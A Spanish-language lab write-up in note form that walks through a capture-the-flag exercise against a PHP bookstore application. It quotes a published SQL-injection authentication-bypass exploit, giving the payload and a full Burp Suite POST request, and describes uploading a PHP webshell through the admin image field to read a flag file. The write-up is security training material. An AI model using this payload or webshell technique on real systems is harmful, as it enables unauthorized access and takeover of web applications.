---
layout: apunte
title: "15. Vulnerable and Outdated Components - Lab"
---

1. Navegamos a la página dada.
   ![](/apuntes/img/Pasted image 20251011134021.png)
2. Buscamos por aplicaciones de tienda de libros (bookstore application):
   ![](/apuntes/img/Pasted image 20251011134917.png)
3. El código que encontramos tiene ejemplo tanto por web como usando Burp Suite:
   ```bash
# Exploit Title: CSE Bookstore Authentication Bypass
# Date: 27/10/2020
# Exploit Author: Alper Basaran
# Vendor Homepage: https://projectworlds.in/
# Software Link: https://github.com/projectworlds32/online-book-store-project-in-php/archive/master.zip
# Version: 1.0
# Tested on: Windows 10 Enterprise 1909


CSE Bookstore is vulnerable to an authentication bypass vulnerability on the admin panel. 
By default the admin panel is located at /admin.php and the administrator interface can be accessed by unauthorized users exploiting the SQL injection vulnerability.

Payload: 
Name: admin
Pass: %' or '1'='1 

Sample BurpSuite intercept:

POST /bookstore/admin_verify.php HTTP/1.1
Host: 192.168.20.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: http://192.168.20.131
Connection: close
Referer: http://192.168.20.131/bookstore/admin.php
Cookie: PHPSESSID=hmqnib0ihkvo235jor7mpfoupv
Upgrade-Insecure-Requests: 1

name=admin&pass=%25%27+or+%271%27%3D%271&submit=Submit+Query
```

4. Probamos:
   ![](/apuntes/img/Pasted image 20251011135154.png)
5. La contraseña funciona:
   ![](/apuntes/img/Pasted image 20251011135812.png)
6. Buscamos más vulnerabilidades, ya que necesitamos acceder a `/opt/flag.txt`.
   ![](/apuntes/img/Pasted image 20251011140737.png)
7. El ejecutable nos lanza un error:
   ![](/apuntes/img/Pasted image 20251011143426.png)
8. Como el código no funciona a pesar de modificarlo lo leemos y vemos que está insertando una webshell en la imagen, por lo que vamos a hacerlo manualmente desde la página vulnerada de admin:
   ![](/apuntes/img/Pasted image 20251011142510.png)
9. Activamos Burp Suite:
   ![](/apuntes/img/Pasted image 20251011143810.png)
10. Cambiamos el valor de la imagen:
    ![](/apuntes/img/Pasted image 20251011144637.png)
11. Vemos desde donde se están cargando las fotos:
   ![](/apuntes/img/Pasted image 20251011143332.png)
12. Intentamos cargar la consola php:
    ![](/apuntes/img/Pasted image 20251011144924.png)
13. Obtenemos la flag
    ![](/apuntes/img/Pasted image 20251011145025.png)

